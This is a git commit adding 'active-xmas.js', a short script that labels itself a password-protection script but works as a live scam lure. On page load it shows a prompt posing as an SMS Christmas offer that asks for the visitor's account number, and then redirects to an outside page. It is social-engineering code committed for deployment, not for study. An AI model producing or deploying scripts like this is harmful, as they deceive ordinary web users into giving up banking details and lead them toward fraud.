db9ff59a1c34d3710eb0aad0c6eb3ac7dc93f90c
itidnewblog1 <newblog1itid@gmail.com>
2025-12-18 19:59:20 +0100

    Create active-xmas.js

---
+++ active-xmas.js
@@ -0,0 +1,10 @@
+  
+/* Password Protection Script by www.onlineofferz.xyz*/
+var password = 'WITHDRAW CASH'
+password = prompt(
+  'SMS: Congratulations! You are eligible to receive Christmas offer. Please press OK to Enter your Account Number.',
+  'WITHDRAW CASH'
+);
+if (password != 'WITHDRAW CASH') {
+  location.href = 'https://rhward.org/xmas-ng.html';
+}
